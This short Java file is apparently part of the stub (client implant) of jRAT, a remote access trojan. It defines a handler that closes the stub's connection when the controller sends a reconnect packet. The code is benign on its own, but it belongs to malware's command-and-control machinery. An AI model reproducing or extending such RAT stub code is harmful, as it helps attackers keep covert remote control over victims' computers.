package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;

public class Packet45Reconnect extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Connection.socket.close();
	}

}
